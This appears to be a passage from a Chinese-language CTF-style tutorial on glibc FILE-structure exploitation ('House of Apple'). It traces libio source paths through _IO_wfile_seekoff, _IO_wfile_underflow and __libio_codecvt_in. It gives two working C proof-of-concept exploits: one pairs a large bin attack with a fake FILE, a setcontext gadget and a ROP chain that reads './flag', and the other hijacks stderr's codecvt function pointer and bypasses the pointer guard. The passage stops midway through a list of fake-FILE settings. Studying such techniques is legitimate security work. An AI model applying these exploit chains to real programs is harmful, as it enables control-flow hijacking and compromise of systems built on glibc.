<p>详细分析如下：</p>
<p>首先看 <code>_IO_wfile_seekoff</code> 函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF; </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>为了调用 <code>_IO_switch_to_wget_mode</code> 函数，需要满足
<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>
或 <code>(fp)-&gt;_flags &amp; 0x0800 != 0</code> 。</p>
<p>接着看 <code>_IO_switch_to_wget_mode</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code>_IO_WOVERFLOW(fp)</code>。</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: stderr -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = libc_base + <span class="number">0x3b87a0</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="type">size_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = stderr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_wfile_jumps_addr = libc_base + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x121a90</span>; <span class="comment">// mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x3aaa8</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x23256</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x2d89f</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x3ac69</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake file</span></span><br><span class="line">    large[<span class="number">-2</span>] &amp;= ~<span class="number">0x8</span>; <span class="comment">// _flags &amp;= ~0x8</span></span><br><span class="line">    large[<span class="number">-1</span>] = (<span class="type">size_t</span>) payload;</span><br><span class="line">    large[<span class="number">25</span>] = IO_wfile_jumps_addr + <span class="number">0x10</span>; <span class="comment">// vtable -&gt; _IO_wfile_jumps + 0x10</span></span><br><span class="line">    large[<span class="number">15</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    large[<span class="number">18</span>] = (<span class="type">size_t</span>) unsorted;<span class="comment">// _wide_data</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake _wide_data</span></span><br><span class="line">    unsorted[<span class="number">4</span>] = (<span class="type">size_t</span>) (<span class="number">-1</span>); <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    unsorted[<span class="number">28</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">//_wide_vtable</span></span><br><span class="line">    unsorted[<span class="number">3</span>] = (<span class="type">size_t</span>) magic_gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SigreturnFrame</span></span><br><span class="line">    payload[<span class="number">4</span>] = (<span class="type">size_t</span>) setcontext + <span class="number">53</span>;</span><br><span class="line">    payload[<span class="number">13</span>] = (<span class="type">size_t</span>) buf; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">    payload[<span class="number">14</span>] = <span class="number">0</span>; <span class="comment">// rsi = 0</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0x100</span>; <span class="comment">// rdx = 0x100 read 0x100 bytes</span></span><br><span class="line">    payload[<span class="number">20</span>] = (<span class="type">size_t</span>) &amp;payload[<span class="number">31</span>]; <span class="comment">// rsp -&gt; fake stack</span></span><br><span class="line">    payload[<span class="number">21</span>] = ret; <span class="comment">// rip -&gt; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    payload[<span class="number">31</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">32</span>] = <span class="number">2</span>;</span><br><span class="line">    payload[<span class="number">33</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">34</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">36</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">37</span>] = <span class="number">3</span>;</span><br><span class="line">    payload[<span class="number">38</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">39</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">40</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">41</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">42</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">43</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">45</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">46</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">47</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __malloc_assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_chunk_addr = unsorted + <span class="number">0x124</span>;</span><br><span class="line">    top_chunk_addr[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="house-of-apple3">House of Apple3</h2>
<p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体相关定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。</p>
<p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">            <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"> </span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">             (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">             &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">       <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<h3
id="利用_io_wfile_underflow函数控制程序执行流">利用_IO_wfile_underflow函数控制程序执行流</h3>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *) puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *) libc_base_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x3b85e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_2_1_stderr_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = libc_base_addr + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_wfile_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *) _IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: set stderr-&gt;_flags to ~(4 | 0x10))&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_read_ptr &lt; stderr-&gt;_IO_read_end&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0x10</span>) = (<span class="type">size_t</span>) <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: set stderr-&gt;vtable to _IO_wfile_jumps-0x40&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr - <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: set stderr-&gt;codecvt with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (stderr2 + <span class="number">0x98</span>) = (<span class="type">size_t</span>) p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;codecvt-&gt;__cd_in.step with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) p1 = (<span class="type">size_t</span>) p2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: put backdoor at stderr-&gt;codecvt-&gt;__cd_in.step-&gt;__fct&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) (p2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>) (&amp;backdoor);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下：</p>
<p>在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code>，代码片段如下：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 需要进入这个分支</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">    <span class="comment">// 需要一路调用到这里</span></span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                   &amp;read_stop,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">           <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。</p>
<p>因此可以劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
<p>注意，在伪造过程中，可以设置<code>gs-&gt;__shlib_handle == NULL</code>，从而绕过<code>__pointer_guard</code>的指针调用保护。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/38d0b44c50e70fcfc5ee911fd5627d79.png"
                     
alt="在这里插入图片描述" 
                > ###
利用_IO_wfile_underflow_mmap函数控制程序执行流</p>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
